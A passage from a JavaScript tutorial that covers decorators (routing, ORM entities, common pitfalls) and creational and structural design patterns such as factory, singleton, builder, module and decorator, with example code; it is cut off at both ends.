const del = (path) => route('DELETE', path);

// Middleware decorator
function middleware(...middlewares) {
  return function(value, context) {
    if (context.kind === 'method') {
      // Wrap method with middleware chain
      return async function(...args) {
        for (const mw of middlewares) {
          await mw(...args);
        }
        return value.apply(this, args);
      };
    }
  };
}

// Usage
const authenticate = async (req, res, next) => {
  if (!req.user) throw new Error('Unauthorized');
};

@controller('/api/users')
class UserController {
  @get('/')
  async list(req, res) {
    return { users: [] };
  }
  
  @get('/:id')
  async get(req, res) {
    return { user: { id: req.params.id } };
  }
  
  @post('/')
  @middleware(authenticate)
  async create(req, res) {
    return { created: true };
  }
  
  @del('/:id')
  @middleware(authenticate)
  async delete(req, res) {
    return { deleted: true };
  }
}

// Register routes with Express
function registerRoutes(app) {
  routes.forEach(route => {
    const fullPath = route.basePath + route.path;
    console.log(`Registering ${route.method} ${fullPath}`);
    // app[route.method.toLowerCase()](fullPath, route.handler);
  });
}
```

### ORM-Style Entity Decorators

```javascript
// Database entity metadata
const entityMetadata = new Map();

function entity(tableName) {
  return function(value, context) {
    if (context.kind === 'class') {
      entityMetadata.set(value, {
        tableName,
        columns: []
      });
      return value;
    }
  };
}

function column(options = {}) {
  return function(value, context) {
    if (context.kind === 'field') {
      context.addInitializer(function() {
        const meta = entityMetadata.get(this.constructor);
        if (meta) {
          meta.columns.push({
            name: options.name || context.name,
            property: context.name,
            type: options.type || 'string',
            nullable: options.nullable ?? true,
            primary: options.primary ?? false
          });
        }
      });
      return function(initialValue) {
        return initialValue;
      };
    }
  };
}

function primaryKey(value, context) {
  return column({ primary: true, type: 'integer', nullable: false })(value, context);
}

// Usage
@entity('users')
class User {
  @primaryKey
  id = 0;
  
  @column({ type: 'string', nullable: false })
  name = '';
  
  @column({ type: 'string', name: 'email_address' })
  email = '';
  
  @column({ type: 'timestamp' })
  createdAt = new Date();
}

// Generate SQL from metadata
function generateCreateTable(EntityClass) {
  const meta = entityMetadata.get(EntityClass);
  const instance = new EntityClass();  // Trigger initializers
  
  const columnDefs = meta.columns.map(col => {
    let def = `${col.name} ${col.type.toUpperCase()}`;
    if (col.primary) def += ' PRIMARY KEY';
    if (!col.nullable) def += ' NOT NULL';
    return def;
  });
  
  return `CREATE TABLE ${meta.tableName} (\n  ${columnDefs.join(',\n  ')}\n);`;
}

console.log(generateCreateTable(User));
// CREATE TABLE users (
//   id INTEGER PRIMARY KEY NOT NULL,
//   name STRING NOT NULL,
//   email_address STRING,
//   createdAt TIMESTAMP
// );
```

---

## 21.8 Common Pitfalls

### Pitfall 1: Decorator Order Matters

```javascript
// Decorators apply BOTTOM to TOP (closest to target first)
@first   // Executed LAST
@second  // Executed SECOND
@third   // Executed FIRST (closest to class)
class MyClass {}

// This matters for method decorators!
@logged     // Logs the cached result, not the original call
@cached     // Caches the result
async getData() { ... }

// vs

@cached     // Caches the logged result (probably not what you want)
@logged     // Logs every call
async getData() { ... }
```

### Pitfall 2: this Binding in Decorators

```javascript
// âŒ WRONG: Arrow functions lose class binding
function logged(value, context) {
  if (context.kind === 'method') {
    return (...args) => {  // Arrow function!
      console.log(`Calling ${context.name}`);
      return value(...args);  // 'this' is wrong!
    };
  }
}

// âœ… CORRECT: Use regular function
function logged(value, context) {
  if (context.kind === 'method') {
    return function(...args) {  // Regular function
      console.log(`Calling ${context.name}`);
      return value.call(this, ...args);  // Preserve 'this'
    };
  }
}
```

### Pitfall 3: Async Method Decoration

```javascript
// âŒ WRONG: Not handling async
function timed(value, context) {
  if (context.kind === 'method') {
    return function(...args) {
      const start = Date.now();
      const result = value.call(this, ...args);  // Returns promise!
      console.log(`Took ${Date.now() - start}ms`);  // Logs immediately
      return result;
    };
  }
}

// âœ… CORRECT: Handle both sync and async
function timed(value, context) {
  if (context.kind === 'method') {
    return function(...args) {
      const start = Date.now();
      const result = value.call(this, ...args);
      
      if (result instanceof Promise) {
        return result.finally(() => {
          console.log(`Took ${Date.now() - start}ms`);
        });
      }
      
      console.log(`Took ${Date.now() - start}ms`);
      return result;
    };
  }
}
```

---

## Summary

| Decorator Type | Target | Returns |
|---------------|--------|---------|
| **Class** | Class constructor | Modified/new class |
| **Method** | Method function | Modified function |
| **Field** | Field initializer | Modified initializer |
| **Accessor** | Getter/setter | New getter/setter object |
| **Auto-accessor** | Auto accessor | Modified get/set/init |

### Context Object Properties

| Property | Description |
|----------|-------------|
| `kind` | `'class'`, `'method'`, `'field'`, `'accessor'`, `'getter'`, `'setter'` |
| `name` | Name of decorated element |
| `static` | `true` if static member |
| `private` | `true` if private member |
| `access` | Object with `get()` and `set()` for fields |
| `addInitializer()` | Register callback to run during construction |

### Best Practices

1. **Keep decorators focused** â€” one concern per decorator
2. **Make decorators composable** â€” design for stacking
3. **Handle async properly** â€” check for Promise returns
4. **Preserve `this` binding** â€” use regular functions, not arrows
5. **Document decorator order** â€” when order matters, make it clear
6. **Provide good error messages** â€” decorators run at definition time

---

**End of Chapter 21**


# 22-Design-Patterns.md

# 22 Design Patterns

Design patterns are reusable solutions to common programming problems. This chapter covers creational, structural, behavioral, functional, and async patterns in JavaScript.

---

# Creational Patterns


## Creational Patterns

Creational patterns deal with object creation mechanisms, trying to create objects in a manner suitable to the situation.

---

## Factory Pattern

The Factory Pattern creates objects without specifying the exact class to create. It provides an interface for creating objects.

### Simple Factory

```javascript
// Product classes
class Car {
  constructor(options) {
    this.type = 'car';
    this.doors = options.doors || 4;
    this.state = options.state || 'new';
    this.color = options.color || 'white';
  }
}

class Truck {
  constructor(options) {
    this.type = 'truck';
    this.doors = options.doors || 2;
    this.state = options.state || 'used';
    this.color = options.color || 'black';
    this.wheelSize = options.wheelSize || 'large';
  }
}

class Motorcycle {
  constructor(options) {
    this.type = 'motorcycle';
    this.state = options.state || 'new';
    this.color = options.color || 'red';
    this.engineSize = options.engineSize || '500cc';
  }
}

// Factory
class VehicleFactory {
  createVehicle(type, options = {}) {
    switch (type) {
      case 'car':
        return new Car(options);
      case 'truck':
        return new Truck(options);
      case 'motorcycle':
        return new Motorcycle(options);
      default:
        throw new Error('Unknown vehicle type');
    }
  }
}

// Usage
const factory = new VehicleFactory();

const car = factory.createVehicle('car', {
  color: 'blue',
  doors: 4
});

const truck = factory.createVehicle('truck', {
  color: 'red',
  wheelSize: 'large'
});

const motorcycle = factory.createVehicle('motorcycle', {
  engineSize: '1000cc'
});

console.log(car); // Car { type: 'car', doors: 4, color: 'blue', ... }
```

### Factory Method Pattern

```javascript
// Abstract creator
class VehicleFactory {
  createVehicle(options) {
    throw new Error('createVehicle must be implemented');
  }
}

// Concrete creators
class CarFactory extends VehicleFactory {
  createVehicle(options) {
    return new Car(options);
  }
}

class TruckFactory extends VehicleFactory {
  createVehicle(options) {
    return new Truck(options);
  }
}

// Usage
const carFactory = new CarFactory();
const truckFactory = new TruckFactory();

const sedan = carFactory.createVehicle({ doors: 4, color: 'silver' });
const pickupTruck = truckFactory.createVehicle({ wheelSize: 'medium' });
```

### Abstract Factory Pattern

```javascript
// Abstract product families
class Button {
  render() {
    throw new Error('render must be implemented');
  }
}

class Checkbox {
  render() {
    throw new Error('render must be implemented');
  }
}

// Concrete products - Windows
class WindowsButton extends Button {
  render() {
    return '<button class="windows">Windows Button</button>';
  }
}

class WindowsCheckbox extends Checkbox {
  render() {
    return '<input type="checkbox" class="windows" />';
  }
}

// Concrete products - Mac
class MacButton extends Button {
  render() {
    return '<button class="mac">Mac Button</button>';
  }
}

class MacCheckbox extends Checkbox {
  render() {
    return '<input type="checkbox" class="mac" />';
  }
}

// Abstract factory
class GUIFactory {
  createButton() {
    throw new Error('createButton must be implemented');
  }
  
  createCheckbox() {
    throw new Error('createCheckbox must be implemented');
  }
}

// Concrete factories
class WindowsFactory extends GUIFactory {
  createButton() {
    return new WindowsButton();
  }
  
  createCheckbox() {
    return new WindowsCheckbox();
  }
}

class MacFactory extends GUIFactory {
  createButton() {
    return new MacButton();
  }
  
  createCheckbox() {
    return new MacCheckbox();
  }
}

// Usage
function createUI(factory) {
  const button = factory.createButton();
  const checkbox = factory.createCheckbox();
  
  return {
    button: button.render(),
    checkbox: checkbox.render()
  };
}

const windowsFactory = new WindowsFactory();
const macFactory = new MacFactory();

console.log(createUI(windowsFactory));
// { button: '<button class="windows">...</button>', ... }

console.log(createUI(macFactory));
// { button: '<button class="mac">...</button>', ... }
```

### Practical Factory Example

```javascript
// User factory with different types
class User {
  constructor(name, permissions) {
    this.name = name;
    this.permissions = permissions;
  }
  
  hasPermission(permission) {
    return this.permissions.includes(permission);
  }
}

class UserFactory {
  createUser(name, type) {
    switch (type) {
      case 'admin':
        return new User(name, ['read', 'write', 'delete', 'admin']);
      case 'editor':
        return new User(name, ['read', 'write']);
      case 'viewer':
        return new User(name, ['read']);
      default:
        return new User(name, []);
    }
  }
}

// Usage
const factory = new UserFactory();

const admin = factory.createUser('Alice', 'admin');
const editor = factory.createUser('Bob', 'editor');
const viewer = factory.createUser('Charlie', 'viewer');

console.log(admin.hasPermission('delete')); // true
console.log(editor.hasPermission('delete')); // false
console.log(viewer.hasPermission('write')); // false
```

---

## Constructor Pattern

The Constructor Pattern uses constructor functions or ES6 classes to create objects.

### Function Constructor

```javascript
function Person(name, age, job) {
  this.name = name;
  this.age = age;
  this.job = job;
  
  this.sayName = function() {
    console.log(this.name);
  };
}

const person1 = new Person('Alice', 30, 'Engineer');
const person2 = new Person('Bob', 25, 'Designer');

person1.sayName(); // "Alice"
```

### Constructor with Prototype

```javascript
function Person(name, age, job) {
  this.name = name;
  this.age = age;
  this.job = job;
}

// Shared methods on prototype
Person.prototype.sayName = function() {
  console.log(this.name);
};

Person.prototype.getDetails = function() {
  return `${this.name}, ${this.age}, ${this.job}`;
};

const person = new Person('Alice', 30, 'Engineer');
person.sayName(); // "Alice"
console.log(person.getDetails()); // "Alice, 30, Engineer"
```

### ES6 Class Constructor

```javascript
class Person {
  constructor(name, age, job) {
    this.name = name;
    this.age = age;
    this.job = job;
  }
  
  sayName() {
    console.log(this.name);
  }
  
  getDetails() {
    return `${this.name}, ${this.age}, ${this.job}`;
  }
  
  static create(name, age, job) {
    return new Person(name, age, job);
  }
}

const person = new Person('Alice', 30, 'Engineer');
person.sayName();

// Using static factory method
const person2 = Person.create('Bob', 25, 'Designer');
```

### Constructor with Private Properties

```javascript
class BankAccount {
  #balance;
  #pin;
  
  constructor(accountNumber, initialBalance, pin) {
    this.accountNumber = accountNumber;
    this.#balance = initialBalance;
    this.#pin = pin;
  }
  
  deposit(amount) {
    if (amount > 0) {
      this.#balance += amount;
      return true;
    }
    return false;
  }
  
  withdraw(amount, pin) {
    if (pin !== this.#pin) {
      throw new Error('Invalid PIN');
    }
    
    if (amount > this.#balance) {
      throw new Error('Insufficient funds');
    }
    
    this.#balance -= amount;
    return true;
  }
  
  getBalance(pin) {
    if (pin !== this.#pin) {
      throw new Error('Invalid PIN');
    }
    return this.#balance;
  }
}

const account = new BankAccount('123456', 1000, '1234');
account.deposit(500);
console.log(account.getBalance('1234')); // 1500
// console.log(account.#balance); // SyntaxError: Private field
```

### Constructor with Validation

```javascript
class User {
  constructor(name, email, age) {
    // Validation
    if (!name || typeof name !== 'string') {
      throw new TypeError('Name must be a non-empty string');
    }
    
    if (!email || !email.includes('@')) {
      throw new TypeError('Invalid email address');
    }
    
    if (age < 0 || age > 150) {
      throw new RangeError('Age must be between 0 and 150');
    }
    
    this.name = name;
    this.email = email;
    this.age = age;
    this.createdAt = new Date();
  }
  
  toJSON() {
    return {
      name: this.name,
      email: this.email,
      age: this.age,
      createdAt: this.createdAt.toISOString()
    };
  }
}

const user = new User('Alice', 'alice@example.com', 30);
// const invalid = new User('', 'bad-email', -5); // Throws errors
```

---

## Singleton Pattern

The Singleton Pattern ensures a class has only one instance and provides a global point of access to it.

### Basic Singleton

```javascript
class Singleton {
  constructor() {
    if (Singleton.instance) {
      return Singleton.instance;
    }
    
    this.data = {};
    Singleton.instance = this;
  }
  
  setData(key, value) {
    this.data[key] = value;
  }
  
  getData(key) {
    return this.data[key];
  }
}

const instance1 = new Singleton();
const instance2 = new Singleton();

console.log(instance1 === instance2); // true

instance1.setData('name', 'Alice');
console.log(instance2.getData('name')); // "Alice"
```

### Singleton with Private Constructor

```javascript
class Database {
  static #instance;
  
  constructor() {
    if (Database.#instance) {
      throw new Error('Use Database.getInstance()');
    }
    
    this.connection = null;
    Database.#instance = this;
  }
  
  static getInstance() {
    if (!Database.#instance) {
      Database.#instance = new Database();
    }
    return Database.#instance;
  }
  
  connect(connectionString) {
    this.connection = {
      string: connectionString,
      status: 'connected'
    };
    console.log('Connected to database');
  }
  
  query(sql) {
    if (!this.connection) {
      throw new Error('Not connected to database');
    }
    console.log('Executing query:', sql);
    return { results: [] };
  }
}

// Usage
const db1 = Database.getInstance();
const db2 = Database.getInstance();

console.log(db1 === db2); // true

db1.connect('mysql://localhost:3306/mydb');
db2.query('SELECT * FROM users'); // Works because same instance

// const db3 = new Database(); // Error: Use Database.getInstance()
```

### Lazy Singleton

```javascript
class ConfigManager {
  static #instance;
  
  constructor() {
    this.config = {};
  }
  
  static getInstance() {
    if (!ConfigManager.#instance) {
      console.log('Creating ConfigManager instance');
      ConfigManager.#instance = new ConfigManager();
    }
    return ConfigManager.#instance;
  }
  
  set(key, value) {
    this.config[key] = value;
  }
  
  get(key) {
    return this.config[key];
  }
}

// Instance only created when first needed
const config1 = ConfigManager.getInstance(); // Logs: "Creating..."
const config2 = ConfigManager.getInstance(); // No log (reuses instance)

config1.set('apiUrl', 'https://api.example.com');
console.log(config2.get('apiUrl')); // "https://api.example.com"
```

### Singleton Module Pattern

```javascript
// Using closure for singleton
const Logger = (function() {
  let instance;
  
  function createInstance() {
    const logs = [];
    
    return {
      log(message) {
        logs.push({
          message,
          timestamp: new Date()
        });
        console.log(`[${new Date().toISOString()}] ${message}`);
      },
      
      getLogs() {
        return [...logs];
      },
      
      clearLogs() {
        logs.length = 0;
      }
    };
  }
  
  return {
    getInstance() {
      if (!instance) {
        instance = createInstance();
      }
      return instance;
    }
  };
})();

// Usage
const logger1 = Logger.getInstance();
const logger2 = Logger.getInstance();

logger1.log('First message');
logger2.log('Second message');

console.log(logger1 === logger2); // true
console.log(logger1.getLogs().length); // 2
```

---

## Prototype Pattern

The Prototype Pattern creates objects based on a template of an existing object through cloning.

### Basic Prototype

```javascript
const carPrototype = {
  init(model, year) {
    this.model = model;
    this.year = year;
  },
  
  getInfo() {
    return `${this.year} ${this.model}`;
  }
};

// Create objects from prototype
const car1 = Object.create(carPrototype);
car1.init('Toyota Camry', 2024);

const car2 = Object.create(carPrototype);
car2.init('Honda Accord', 2023);

console.log(car1.getInfo()); // "2024 Toyota Camry"
console.log(car2.getInfo()); // "2023 Honda Accord"
```

### Prototype with Clone Method

```javascript
class Person {
  constructor(name, age, address) {
    this.name = name;
    this.age = age;
    this.address = address;
  }
  
  clone() {
    // Deep clone
    return new Person(
      this.name,
      this.age,
      { ...this.address }
    );
  }
  
  display() {
    console.log(`${this.name}, ${this.age}, ${this.address.city}`);
  }
}

const original = new Person('Alice', 30, {
  city: 'New York',
  zip: '10001'
});

const clone = original.clone();
clone.name = 'Bob';
clone.address.city = 'Boston';

original.display(); // "Alice, 30, New York"
clone.display(); // "Bob, 30, Boston"
```

### Prototype Registry

```javascript
class PrototypeRegistry {
  constructor() {
    this.prototypes = new Map();
  }
  
  registerPrototype(name, prototype) {
    this.prototypes.set(name, prototype);
  }
  
  getPrototype(name) {
    const prototype = this.prototypes.get(name);
    if (!prototype) {
      throw new Error(`Prototype ${name} not found`);
    }
    return prototype;
  }
  
  createInstance(name) {
    const prototype = this.getPrototype(name);
    return Object.create(prototype);
  }
}

// Shape prototypes
const circlePrototype = {
  type: 'circle',
  radius: 0,
  
  init(radius) {
    this.radius = radius;
  },
  
  getArea() {
    return Math.PI * this.radius ** 2;
  }
};

const rectanglePrototype = {
  type: 'rectangle',
  width: 0,
  height: 0,
  
  init(width, height) {
    this.width = width;
    this.height = height;
  },
  
  getArea() {
    return this.width * this.height;
  }
};

// Usage
const registry = new PrototypeRegistry();
registry.registerPrototype('circle', circlePrototype);
registry.registerPrototype('rectangle', rectanglePrototype);

const circle = registry.createInstance('circle');
circle.init(5);
console.log(circle.getArea()); // 78.54

const rect = registry.createInstance('rectangle');
rect.init(4, 6);
console.log(rect.getArea()); // 24
```

### Deep Clone Pattern

```javascript
class DeepCloneable {
  clone() {
    // Simple deep clone using JSON (has limitations)
    return JSON.parse(JSON.stringify(this));
  }
  
  // Better deep clone
  deepClone() {
    const cloned = Object.create(Object.getPrototypeOf(this));
    
    for (const key of Object.keys(this)) {
      const value = this[key];
      
      if (value && typeof value === 'object') {
        if (Array.isArray(value)) {
          cloned[key] = value.map(item => 
            item && typeof item === 'object' ? 
            this.deepCloneObject(item) : item
          );
        } else if (value instanceof Date) {
          cloned[key] = new Date(value);
        } else {
          cloned[key] = this.deepCloneObject(value);
        }
      } else {
        cloned[key] = value;
      }
    }
    
    return cloned;
  }
  
  deepCloneObject(obj) {
    const cloned = {};
    for (const key in obj) {
      if (obj.hasOwnProperty(key)) {
        const value = obj[key];
        if (value && typeof value === 'object') {
          cloned[key] = this.deepCloneObject(value);
        } else {
          cloned[key] = value;
        }
      }
    }
    return cloned;
  }
}

class GameCharacter extends DeepCloneable {
  constructor(name, stats) {
    super();
    this.name = name;
    this.stats = stats;
    this.inventory = [];
  }
}

const warrior = new GameCharacter('Warrior', {
  health: 100,
  strength: 80,
  defense: 60
});
warrior.inventory = ['sword', 'shield'];

const clone = warrior.deepClone();
clone.name = 'Clone Warrior';
clone.stats.health = 150;
clone.inventory.push('potion');

console.log(warrior.stats.health); // 100 (unchanged)
console.log(clone.stats.health); // 150
console.log(warrior.inventory.length); // 2
console.log(clone.inventory.length); // 3
```

---

## Builder Pattern

The Builder Pattern constructs complex objects step by step. It separates construction from representation.

### Basic Builder

```javascript
class Car {
  constructor() {
    this.make = '';
    this.model = '';
    this.year = 0;
    this.color = '';
    this.features = [];
  }
}

class CarBuilder {
  constructor() {
    this.car = new Car();
  }
  
  setMake(make) {
    this.car.make = make;
    return this; // Enable chaining
  }
  
  setModel(model) {
    this.car.model = model;
    return this;
  }
  
  setYear(year) {
    this.car.year = year;
    return this;
  }
  
  setColor(color) {
    this.car.color = color;
    return this;
  }
  
  addFeature(feature) {
    this.car.features.push(feature);
    return this;
  }
  
  build() {
    return this.car;
  }
}

// Usage
const car = new CarBuilder()
  .setMake('Toyota')
  .setModel('Camry')
  .setYear(2024)
  .setColor('Blue')
  .addFeature('Sunroof')
  .addFeature('Leather Seats')
  .addFeature('Navigation')
  .build();

console.log(car);
```

### Director Pattern

```javascript
class Computer {
  constructor() {
    this.cpu = '';
    this.ram = 0;
    this.storage = 0;
    this.gpu = '';
  }
  
  display() {
    console.log(`CPU: ${this.cpu}, RAM: ${this.ram}GB, Storage: ${this.storage}GB, GPU: ${this.gpu}`);
  }
}

class ComputerBuilder {
  constructor() {
    this.computer = new Computer();
  }
  
  setCPU(cpu) {
    this.computer.cpu = cpu;
    return this;
  }
  
  setRAM(ram) {
    this.computer.ram = ram;
    return this;
  }
  
  setStorage(storage) {
    this.computer.storage = storage;
    return this;
  }
  
  setGPU(gpu) {
    this.computer.gpu = gpu;
    return this;
  }
  
  build() {
    return this.computer;
  }
}

// Director - defines standard configurations
class ComputerDirector {
  constructor(builder) {
    this.builder = builder;
  }
  
  buildGamingComputer() {
    return this.builder
      .setCPU('Intel i9')
      .setRAM(32)
      .setStorage(2000)
      .setGPU('NVIDIA RTX 4090')
      .build();
  }
  
  buildOfficeComputer() {
    return this.builder
      .setCPU('Intel i5')
      .setRAM(16)
      .setStorage(512)
      .setGPU('Integrated')
      .build();
  }
  
  buildBudgetComputer() {
    return this.builder
      .setCPU('Intel i3')
      .setRAM(8)
      .setStorage(256)
      .setGPU('Integrated')
      .build();
  }
}

// Usage
const director = new ComputerDirector(new ComputerBuilder());

const gamingPC = director.buildGamingComputer();
gamingPC.display();

const officePC = director.buildOfficeComputer();
officePC.display();

// Custom build
const customPC = new ComputerBuilder()
  .setCPU('AMD Ryzen 9')
  .setRAM(64)
  .setStorage(4000)
  .setGPU('NVIDIA RTX 4080')
  .build();
customPC.display();
```

### Fluent Builder with Validation

```javascript
class UserBuilder {
  constructor() {
    this.user = {
      name: '',
      email: '',
      age: 0,
      address: {},
      preferences: {}
    };
  }
  
  setName(name) {
    if (!name || typeof name !== 'string') {
      throw new Error('Invalid name');
    }
    this.user.name = name;
    return this;
  }
  
  setEmail(email) {
    if (!email || !email.includes('@')) {
      throw new Error('Invalid email');
    }
    this.user.email = email;
    return this;
  }
  
  setAge(age) {
    if (age < 0 || age > 150) {
      throw new Error('Invalid age');
    }
    this.user.age = age;
    return this;
  }
  
  setAddress(street, city, zip) {
    this.user.address = { street, city, zip };
    return this;
  }
  
  setPreference(key, value) {
    this.user.preferences[key] = value;
    return this;
  }
  
  build() {
    // Final validation
    if (!this.user.name || !this.user.email) {
      throw new Error('Name and email are required');
    }
    return this.user;
  }
}

// Usage
const user = new UserBuilder()
  .setName('Alice')
  .setEmail('alice@example.com')
  .setAge(30)
  .setAddress('123 Main St', 'New York', '10001')
  .setPreference('theme', 'dark')
  .setPreference('language', 'en')
  .build();

console.log(user);
```

---

## Module Pattern

The Module Pattern encapsulates private and public members, providing a clean API.

### Basic Module Pattern

```javascript
const CounterModule = (function() {
  // Private variables
  let count = 0;
  
  // Private methods
  function logCount() {
    console.log(`Current count: ${count}`);
  }
  
  // Public API
  return {
    increment() {
      count++;
      logCount();
    },
    
    decrement() {
      count--;
      logCount();
    },
    
    getCount() {
      return count;
    },
    
    reset() {
      count = 0;
      logCount();
    }
  };
})();

// Usage
CounterModule.increment(); // "Current count: 1"
CounterModule.increment(); // "Current count: 2"
console.log(CounterModule.getCount()); // 2
CounterModule.reset(); // "Current count: 0"

// count is private
// console.log(CounterModule.count); // undefined
```

### Revealing Module Pattern

```javascript
const ShoppingCart = (function() {
  // Private data
  const items = [];
  
  // Private methods
  function calculateTotal() {
    return items.reduce((sum, item) => sum + item.price * item.quantity, 0);
  }
  
  function findItem(productId) {
    return items.find(item => item.productId === productId);
  }
  
  // Public methods
  function addItem(productId, name, price, quantity = 1) {
    const existingItem = findItem(productId);
    
    if (existingItem) {
      existingItem.quantity += quantity;
    } else {
      items.push({ productId, name, price, quantity });
    }
  }
  
  function removeItem(productId) {
    const index = items.findIndex(item => item.productId === productId);
    if (index > -1) {
      items.splice(index, 1);
    }
  }
  
  function getItems() {
    return [...items]; // Return copy
  }
  
  function getTotal() {
    return calculateTotal();
  }
  
  function clear() {
    items.length = 0;
  }
  
  // Reveal public API
  return {
    addItem,
    removeItem,
    getItems,
    getTotal,
    clear
  };
})();

// Usage
ShoppingCart.addItem(1, 'Laptop', 999, 1);
ShoppingCart.addItem(2, 'Mouse', 25, 2);
ShoppingCart.addItem(1, 'Laptop', 999, 1); // Increases quantity

console.log(ShoppingCart.getItems());
console.log('Total:', ShoppingCart.getTotal()); // 1049
```

### Module with Dependencies

```javascript
const UserModule = (function(validator, storage) {
  const users = [];
  
  function createUser(name, email) {
    if (!validator.isValidEmail(email)) {
      throw new Error('Invalid email');
    }
    
    const user = {
      id: Date.now(),
      name,
      email,
      createdAt: new Date()
    };
    
    users.push(user);
    storage.save('users', users);
    
    return user;
  }
  
  function getUser(id) {
    return users.find(user => user.id === id);
  }
  
  function getAllUsers() {
    return [...users];
  }
  
  function deleteUser(id) {
    const index = users.findIndex(user => user.id === id);
    if (index > -1) {
      users.splice(index, 1);
      storage.save('users', users);
      return true;
    }
    return false;
  }
  
  // Initialize from storage
  (function init() {
    const savedUsers = storage.load('users');
    if (savedUsers) {
      users.push(...savedUsers);
    }
  })();
  
  return {
    createUser,
    getUser,
    getAllUsers,
    deleteUser
  };
})(
  // Validator dependency
  {
    isValidEmail(email) {
      return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
    }
  },
  // Storage dependency
  {
    save(key, data) {
      localStorage.setItem(key, JSON.stringify(data));
    },
    load(key) {
      const data = localStorage.getItem(key);
      return data ? JSON.parse(data) : null;
    }
  }
);
```

### ES6 Module Pattern

```javascript
// userService.js

// Private variables (module scope)
const users = new Map();
let nextId = 1;

// Private functions
function generateId() {
  return nextId++;
}

function validateUser(user) {
  if (!user.name || !user.email) {
    throw new Error('Name and email are required');
  }
}

// Public API
export function createUser(name, email) {
  const user = { id: generateId(), name, email };
  validateUser(user);
  users.set(user.id, user);
  return user;
}

export function getUser(id) {
  return users.get(id);
}

export function updateUser(id, updates) {
  const user = users.get(id);
  if (!user) {
    throw new Error('User not found');
  }
  
  Object.assign(user, updates);
  validateUser(user);
  return user;
}

export function deleteUser(id) {
  return users.delete(id);
}

export function getAllUsers() {
  return Array.from(users.values());
}

// Usage in another file:
// import * as UserService from './userService.js';
// const user = UserService.createUser('Alice', 'alice@example.com');
```

---

## Summary

This document covered Creational Design Patterns:

- **Factory Pattern**: Creating objects without specifying exact class (Simple Factory, Factory Method, Abstract Factory)
- **Constructor Pattern**: Using constructors to create objects (Function constructors, ES6 classes, private properties, validation)
- **Singleton Pattern**: Ensuring only one instance exists (Basic singleton, lazy initialization, module singleton)
- **Prototype Pattern**: Cloning objects from prototypes (Basic prototype, clone methods, deep cloning, prototype registry)
- **Builder Pattern**: Constructing complex objects step-by-step (Basic builder, director pattern, fluent interface with validation)
- **Module Pattern**: Encapsulating private and public members (Basic module, revealing module, dependencies, ES6 modules)

These patterns provide reusable solutions for object creation in JavaScript applications.

---

**Related Topics:**

- Structural Patterns
- Behavioral Patterns
- SOLID Principles
- Dependency Injection
# Structural Patterns


## Structural Patterns

Structural patterns deal with object composition, creating relationships between objects to form larger structures while keeping these structures flexible and efficient.

---

## Decorator Pattern

The Decorator Pattern dynamically adds new functionality to objects without modifying their structure.

### Basic Decorator

```javascript
// Base component
class Coffee {
  cost() {
    return 5;
  }
  
  description() {
    return 'Simple coffee';
  }
}

// Decorators
class MilkDecorator {
  constructor(coffee) {
    this.coffee = coffee;
  }
  
  cost() {
    return this.coffee.cost() + 2;
  }
  
  description() {
    return this.coffee.description() + ', milk';
  }
}

class SugarDecorator {
  constructor(coffee) {
    this.coffee = coffee;
  }
  
  cost() {
    return this.coffee.cost() + 1;
  }
  
  description() {
    return this.coffee.description() + ', sugar';
  }
}

class WhipDecorator {
  constructor(coffee) {
    this.coffee = coffee;
  }
  
  cost() {
    return this.coffee.cost() + 3;
  }
  
  description() {
    return this.coffee.description() + ', whipped cream';
  }
}

// Usage
let myCoffee = new Coffee();
console.log(myCoffee.description(), '-', myCoffee.cost()); // "Simple coffee - 5"

myCoffee = new MilkDecorator(myCoffee);
console.log(myCoffee.description(), '-', myCoffee.cost()); // "Simple coffee, milk - 7"

myCoffee = new SugarDecorator(myCoffee);
console.log(myCoffee.description(), '-', myCoffee.cost()); // "Simple coffee, milk, sugar - 8"

myCoffee = new WhipDecorator(myCoffee);
console.log(myCoffee.description(), '-', myCoffee.cost()); // "Simple coffee, milk, sugar, whipped cream - 11"
```

### Functional Decorator

```javascript
// Base function
function logMessage(message) {
  console.log(message);
}

// Decorators
function withTimestamp(fn) {
  return function(message) {
    const timestamp = new Date().toISOString();
    fn(`[${timestamp}] ${message}`);
  };
}

function withUpperCase(fn) {
  return function(message) {
    fn(message.toUpperCase());
  };
}

function withPrefix(prefix) {
  return function(fn) {
    return function(message) {
      fn(`${prefix}: ${message}`);
    };
  };
}

// Usage
let logger = logMessage;
logger('Hello'); // "Hello"

logger = withTimestamp(logger);
logger('Hello'); // "[2024-02-10T...] Hello"

logger = withUpperCase(logger);
logger('Hello'); // "[2024-02-10T...] HELLO"

logger = withPrefix('INFO')(logger);
logger('Hello'); // "INFO: [2024-02-10T...] HELLO"
```

### Class Method Decorator

```javascript
class User {
  constructor(name) {
    this.name = name;
  }
  
  save() {
    console.log(`Saving user: ${this.name}`);
  }
}

// Decorator function
function withLogging(target, key, descriptor) {
  const original = descriptor.value;
  
  descriptor.value = function(...args) {
    console.log(`Calling ${key} with`, args);
    const result = original.apply(this, args);
    console.log(`${key} completed`);
    return result;
  };
  
  return descriptor;
}

function withValidation(target, key, descriptor) {
  const original = descriptor.value;
  
  descriptor.value = function(...args) {
    if (!this.name) {
      throw new Error('Name is required');
    }
    return original.apply(this, args);
  };
  
  return descriptor;
}

// Apply decorators manually (or use @decorator syntax with transpiler)
Object.defineProperty(
  User.prototype,
  'save',
  withValidation(User.prototype, 'save', 
    withLogging(User.prototype, 'save', 
      Object.getOwnPropertyDescriptor(User.prototype, 'save')
    )
  )
);

const user = new User('Alice');
user.save();
// "Calling save with []"
// "Saving user: Alice"
// "save completed"
```

### UI Component Decorator

```javascript
// Base component
class Component {
  render() {
    return '<div>Base Component</div>';
  }
}

// Decorators
class BorderDecorator {
  constructor(component, style = 'solid') {
    this.component = component;
    this.style = style;
  }
  
  render() {
    const content = this.component.render();
    return `<div style="border: 2px ${this.style} black">${content}</div>`;
  }
}

class ColorDecorator {
  constructor(component, color) {
    this.component = component;
    this.color = color;
  }
  
  render() {
    const content = this.component.render();
    return `<div style="background-color: ${this.color}">${content}</div>`;
  }
}

class ShadowDecorator {
  constructor(component) {
    this.component = component;
  }
  
  render() {
    const content = this.component.render();
    return `<div style="box-shadow: 2px 2px 5px gray">${content}</div>`;
  }
}

// Usage
let component = new Component();
console.log(component.render());
// "<div>Base Component</div>"

component = new BorderDecorator(component, 'dashed');
component = new ColorDecorator(component, 'lightblue');
component = new ShadowDecorator(component);

console.log(component.render());
// Nested divs with all styles applied
```

---

## Facade Pattern

The Facade Pattern provides a simplified interface to a complex subsystem.

### Basic Facade

```javascript
// Complex subsystem
class CPU {
  freeze() {
